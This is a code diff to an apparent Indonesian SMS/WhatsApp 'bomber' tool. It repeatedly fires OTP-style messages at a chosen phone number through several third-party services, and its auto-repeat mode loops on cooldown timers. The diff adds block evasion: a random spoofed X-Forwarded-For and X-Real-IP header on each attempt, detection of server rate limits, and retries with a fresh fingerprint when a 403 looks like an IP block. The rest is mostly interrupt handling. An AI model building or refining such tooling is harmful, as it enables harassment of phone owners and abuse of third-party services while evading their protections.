@@ -42,7 +42,7 @@ APIS = {
     1: {"name": "Bunda.co.id",  "desc": "SMS",       "tag": "BND",
         "cooldown": 180, "color": "bright_magenta", "method": "bunda"},
     2: {"name": "Paper.id SMS", "desc": "SMS",       "tag": "PPR",
-        "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
+        "cooldown": 35,  "color": "bright_green",   "method": "paper_sms"},
     3: {"name": "PlanetBan",    "desc": "WhatsApp",  "tag": "PLB",
         "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
     4: {"name": "ALL TARGETS",  "desc": "Semua API", "tag": "ALL",
@@ -194,8 +194,16 @@ def _h(**extra) -> dict:
     return base
 
 # ══════════════════════════════════════════════════════════════
-#  REQUEST WRAPPER — retry on 403/429
+#  REQUEST WRAPPER — smart retry on 403/429
 # ══════════════════════════════════════════════════════════════
+
+# Kata-kata dalam body 403 yang artinya rate-limit server (bukan IP block)
+_RATE_LIMIT_HINTS = ("please wait", "wait at least", "too many", "rate limit",
+                     "terlalu banyak", "tunggu", "cooldown")
+
+def _is_server_ratelimit(body: str) -> bool:
+    b = body.lower()
+    return any(h in b for h in _RATE_LIMIT_HINTS)
 
 def safe_post(url: str, headers: dict, data=None, files=None,
               timeout: int = 15, retries: int = 3) -> dict:
@@ -203,7 +211,7 @@ def safe_post(url: str, headers: dict, data=None, files=None,
     last_body = ""
     for attempt in range(retries):
         try:
-            # regenerasi headers tiap attempt (fingerprint baru)
+            # regenerasi fingerprint tiap attempt
             hdrs = dict(headers)
             hdrs["X-Forwarded-For"] = rand_ip()
             hdrs["X-Real-IP"]       = hdrs["X-Forwarded-For"]
@@ -225,15 +233,20 @@ def safe_post(url: str, headers: dict, data=None, files=None,
             if is_ok(r.status_code):
                 return {"status": r.status_code, "body": r.text}
 
-            # 429 rate-limit → backoff lalu retry
+            # 429 → baca Retry-After, tunggu, lalu retry
             if r.status_code == 429:
-                wait = float(r.headers.get("Retry-After", random.uniform(2, 5) * (attempt + 1)))
-                time.sleep(min(wait, 10))
+                wait = float(r.headers.get("Retry-After",
+                             random.uniform(2, 5) * (attempt + 1)))
+                time.sleep(min(wait, 12))
                 continue
 
-            # 403 → coba sekali lagi dengan fingerprint baru
+            # 403 → cek apakah server rate-limit (per nomor HP) atau IP block
             if r.status_code == 403:
-                time.sleep(random.uniform(0.5, 1.5))
+                if _is_server_ratelimit(r.text):
+                    # rate-limit per nomor → retry tidak akan membantu, return langsung
+                    return {"status": r.status_code, "body": r.text}
+                # mungkin IP/fingerprint block → coba sekali lagi dengan fingerprint baru
+                time.sleep(random.uniform(0.8, 2.0))
                 continue
 
             # kode lain → langsung return
@@ -394,6 +407,7 @@ def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
 # ══════════════════════════════════════════════════════════════
 
 def wait_until_ready(phone: str, targets: list):
+    """Blokir sampai semua target ready. Ctrl+C di sini → propagate ke session."""
     def any_locked():
         return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                    for a in targets if a["method"] != "all")
@@ -401,12 +415,15 @@ def wait_until_ready(phone: str, targets: list):
     if not any_locked():
         return
 
-    with Live(build_cd_panel(phone, targets),
-              console=console, refresh_per_second=2,
-              transient=True) as live:
-        while any_locked():
-            time.sleep(0.5)
-            live.update(build_cd_panel(phone, targets))
+    try:
+        with Live(build_cd_panel(phone, targets),
+                  console=console, refresh_per_second=2,
+                  transient=True) as live:
+            while any_locked():
+                time.sleep(0.5)
+                live.update(build_cd_panel(phone, targets))
+    except KeyboardInterrupt:
+        raise   # biarkan session yang tangkap, bukan sini
 
     flush_stdin()
 
@@ -416,8 +433,9 @@ def wait_until_ready(phone: str, targets: list):
 
 def ask_yrn(before_send: bool = False) -> str:
     """
-    before_send=True  → prompt sebelum kirim pertama (Y=kirim, R=auto-repeat, N=batal)
-    before_send=False → prompt setelah result + CD selesai
+    before_send=True  → prompt sebelum kirim pertama.
+    before_send=False → prompt setelah result + CD selesai.
+    Ctrl+C di sini = kembali ke menu (return 'n').
     """
     flush_stdin()
     if before_send:
@@ -439,10 +457,13 @@ def ask_yrn(before_send: bool = False) -> str:
 
     console.print(Panel(desc, title=title, border_style=border, padding=(0, 2)))
     while True:
-        flush_stdin()
-        raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
-        if raw in ("y", "r", "n"):
-            return raw
+        try:
+            flush_stdin()
+            raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
+            if raw in ("y", "r", "n"):
+                return raw
+        except (KeyboardInterrupt, EOFError):
+            return "n"
 
 # ══════════════════════════════════════════════════════════════
 #  RESULT PANELS  (Y mode)
@@ -582,7 +603,7 @@ def build_r_live(phone: str, targets: list, stats: dict,
     from rich.console import Group
     body = Group(t, Rule(style="dim"), tcd)
     return Panel(body,
-                 subtitle=f"[dim]{now}   Ctrl+C = stop[/dim]",
+                 subtitle=f"[dim]{now}   Ctrl+C = menu[/dim]",
                  border_style="yellow", padding=(0, 1))
 
 # ══════════════════════════════════════════════════════════════
@@ -590,32 +611,39 @@ def build_r_live(phone: str, targets: list, stats: dict,
 # ══════════════════════════════════════════════════════════════
 
 def session_single(api: dict, phone: str, first_ans: str):
-    """first_ans sudah diketahui (y atau r) sebelum kirim pertama."""
+    """first_ans sudah diketahui (y atau r) sebelum kirim pertama.
+    Ctrl+C di mana saja di dalam sini → kembali ke menu utama."""
     round_n = 0
 
     if first_ans == "r":
-        session_single_r(api, phone, round_n)
+        try:
+            session_single_r(api, phone, round_n)
+        except KeyboardInterrupt:
+            pass
         return
 
     # Y mode
-    while True:
-        round_n += 1
-        with console.status(
-            f"[bold cyan]Mengirim  {api['name']}...", spinner="dots",
-        ):
-            res = dispatch(api["method"], phone)
-        set_cd(phone, api["method"])
+    try:
+        while True:
+            round_n += 1
+            with console.status(
+                f"[bold cyan]Mengirim  {api['name']}...", spinner="dots",
+            ):
+                res = dispatch(api["method"], phone)
+            set_cd(phone, api["method"])
 
-        show_result(api, phone, res, round_n)
+            show_result(api, phone, res, round_n)
 
-        wait_until_ready(phone, [api])
+            wait_until_ready(phone, [api])
 
-        ans = ask_yrn(before_send=False)
-        if ans == "n":
-            return
-        if ans == "r":
-            session_single_r(api, phone, round_n)
-            return
+            ans = ask_yrn(before_send=False)
+            if ans == "n":
+                return
+            if ans == "r":
+                session_single_r(api, phone, round_n)
+                return
+    except KeyboardInterrupt:
+        pass  # balik ke menu
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — SINGLE  (R mode)  — in-place Live tabel
@@ -628,82 +656,93 @@ def session_single_r(api: dict, phone: str, start_round: int):
     last_row     = {}
     title        = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"
 
-    with Live(console=console, refresh_per_second=4, transient=True) as live:
-        while True:
-            rn = round_counts[api["method"]] + 1
-            round_counts[api["method"]] = rn
+    try:
+        with Live(console=console, refresh_per_second=4, transient=True) as live:
+            while True:
+                rn = round_counts[api["method"]] + 1
+                round_counts[api["method"]] = rn
 
-            live.stop()
-            with console.status(
-                f"[bold cyan]Auto  {api['name']}  #{rn}...", spinner="dots",
-            ):
-                res = dispatch(api["method"], phone)
-            set_cd(phone, api["method"])
-            live.start()
+                live.stop()
+                with console.status(
+                    f"[bold cyan]Auto  {api['name']}  #{rn}...", spinner="dots",
+                ):
+                    res = dispatch(api["method"], phone)
+                set_cd(phone, api["method"])
+                live.start()
 
-            code = res.get("status", 0)
-            if is_ok(code):
-                stats[api["method"]]["ok"]  += 1
-            else:
-                stats[api["method"]]["err"] += 1
+                code = res.get("status", 0)
+                if is_ok(code):
+                    stats[api["method"]]["ok"]  += 1
+                else:
+                    stats[api["method"]]["err"] += 1
 
-            last_row[api["method"]] = {
-                "status": code,
-                "time":   datetime.now().strftime("%H:%M:%S"),
-            }
-            live.update(build_r_live(phone, targets, stats, last_row,
-                                     round_counts, title))
-
-            while get_rem(phone, api["method"], api["cooldown"]) > 0:
-                time.sleep(0.25)
+                last_row[api["method"]] = {
+                    "status": code,
+                    "time":   datetime.now().strftime("%H:%M:%S"),
+                }
                 live.update(build_r_live(phone, targets, stats, last_row,
                                          round_counts, title))
+
+                while get_rem(phone, api["method"], api["cooldown"]) > 0:
+                    time.sleep(0.25)
+                    live.update(build_r_live(phone, targets, stats, last_row,
+                                             round_counts, title))
+    except KeyboardInterrupt:
+        pass  # balik ke menu
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — ALL  (Y mode)
 # ══════════════════════════════════════════════════════════════
 
 def session_all(phone: str, first_ans: str):
+    """Ctrl+C di mana saja → kembali ke menu utama."""
     targets = [v for v in APIS.values() if v["method"] != "all"]
     round_n = 0
 
     if first_ans == "r":
-        session_all_r(phone, targets, round_n)
+        try:
+            session_all_r(phone, targets, round_n)
+        except KeyboardInterrupt:
+            pass
         return
 
-    while True:
-        round_n += 1
-        results = []
-        for api in targets:
-            with console.status(
-                f"[bold cyan]->  {api['name']}...", spinner="aesthetic",
-            ):
-                t_str = datetime.now().strftime("%H:%M:%S")
-                res   = dispatch(api["method"], phone)
-                set_cd(phone, api["method"])
-            results.append({
-                "name":   api["name"], "tag": api["tag"],
-                "color":  api["color"],
-                "status": res.get("status", 0), "time": t_str,
-            })
-            time.sleep(0.15)
+    try:
+        while True:
+            round_n += 1
+            results = []
+            for api in targets:
+                with console.status(
+                    f"[bold cyan]->  {api['name']}...", spinner="aesthetic",
+                ):
+                    t_str = datetime.now().strftime("%H:%M:%S")
+                    res   = dispatch(api["method"], phone)
+                    set_cd(phone, api["method"])
+                results.append({
+                    "name":   api["name"], "tag": api["tag"],
+                    "color":  api["color"],
+                    "status": res.get("status", 0), "time": t_str,
+                })
+                time.sleep(0.15)
 
-        show_all_results(phone, results, round_n)
+            show_all_results(phone, results, round_n)
 
-        wait_until_ready(phone, targets)
+            wait_until_ready(phone, targets)
 
-        ans = ask_yrn(before_send=False)
-        if ans == "n":
-            return
-        if ans == "r":
-            session_all_r(phone, targets, round_n)
-            return
+            ans = ask_yrn(before_send=False)
+            if ans == "n":
+                return
+            if ans == "r":
+                session_all_r(phone, targets, round_n)
+                return
+    except KeyboardInterrupt:
+        pass  # balik ke menu
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — ALL  (R mode)  — in-place Live tabel
 # ══════════════════════════════════════════════════════════════
 
 def session_all_r(phone: str, targets: list, initial_round: int = 0):
+    """Ctrl+C → raise KeyboardInterrupt → ditangkap session_all → balik ke menu."""
     round_counts = {a["method"]: initial_round for a in targets}
     stats        = {a["method"]: {"ok": 0, "err": 0} for a in targets}
     last_row     = {}
@@ -750,12 +789,14 @@ def session_all_r(phone: str, targets: list, initial_round: int = 0):
             live.update(build_r_live(phone, targets, stats, last_row,
                                      round_counts, title))
             time.sleep(0.25)
+    # KeyboardInterrupt tidak ditangkap di sini → propagate ke session_all
 
 # ══════════════════════════════════════════════════════════════
 #  INPUT HELPER
 # ══════════════════════════════════════════════════════════════
 
 def ask_phone(current: str = "") -> str:
+    """Ctrl+C di sini → raise KeyboardInterrupt → ditangkap main() → continue ke menu."""
     hint = (f" [dim](Enter = {current})[/dim]"
             if current else " [dim](08xxx / 628xxx)[/dim]")
     while True:
@@ -773,13 +814,17 @@ def ask_phone(current: str = "") -> str:
 # ══════════════════════════════════════════════════════════════
 
 def main():
-    signal.signal(signal.SIGINT, lambda sig, frm: clean_exit())
+    # Tidak pakai global SIGINT handler — Ctrl+C dikelola per konteks:
+    #   di menu utama  → exit
+    #   di dalam sesi  → kembali ke menu
+    signal.signal(signal.SIGINT, signal.SIG_DFL)
 
     current_phone = ""
 
     while True:
         print_home(current_phone)
 
+        # ── Prompt menu utama: Ctrl+C = exit
         try:
             flush_stdin()
             raw    = Prompt.ask("[bold cyan]  >[/bold cyan] Pilih  [dim](0 = exit)[/dim]")
@@ -787,6 +832,8 @@ def main():
         except (ValueError, EOFError):
             time.sleep(0.3)
             continue
+        except KeyboardInterrupt:
+            clean_exit()
 
         if choice == 0:
             clean_exit()
@@ -797,20 +844,23 @@ def main():
 
         api = APIS[choice]
 
-        # Input nomor
+        # ── Input nomor: Ctrl+C = kembali ke menu
         clr()
         console.print(Align.center(Panel(
             f"[{api['color']}]{api['tag']}  {api['name']}[/{api['color']}]",
             border_style="cyan", padding=(0, 4),
         )))
         console.print()
-        current_phone = ask_phone(current_phone)
+        try:
+            current_phone = ask_phone(current_phone)
+        except KeyboardInterrupt:
+            continue
         console.print()
 
         targets = ([v for v in APIS.values() if v["method"] != "all"]
                    if api["method"] == "all" else [api])
 
-        # Cek CD awal
+        # ── Cek CD awal: Ctrl+C = kembali ke menu
         locked = [a for a in targets
                   if get_rem(current_phone, a["method"], a["cooldown"]) > 0]
 
@@ -823,25 +873,31 @@ def main():
                 "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu pilih mode"
                 "\n  [bold cyan]N[/bold cyan] = Batal\n"
             )
-            flush_stdin()
-            ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
-                             default="y").strip().lower()
+            try:
+                flush_stdin()
+                ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
+                                 default="y").strip().lower()
+            except (KeyboardInterrupt, EOFError):
+                continue
             if ans != "y":
                 continue
-            wait_until_ready(current_phone, targets)
+            try:
+                wait_until_ready(current_phone, targets)
+            except KeyboardInterrupt:
+                continue
 
-        # ── Pilih Y/R/N SEBELUM kirim pertama
+        # ── Pilih Y/R/N SEBELUM kirim pertama (Ctrl+C = "n" = menu)
         first_ans = ask_yrn(before_send=True)
         if first_ans == "n":
             continue
 
-        # Mulai sesi dengan mode yang sudah dipilih
+        # ── Mulai sesi — Ctrl+C di dalam sesi = kembali ke sini → loop menu
         if api["method"] == "all":
             session_all(current_phone, first_ans)
         else:
             session_single(api, current_phone, first_ans)
 
-        time.sleep(0.4)
+        time.sleep(0.3)
 
 
 if __name__ == "__main__":
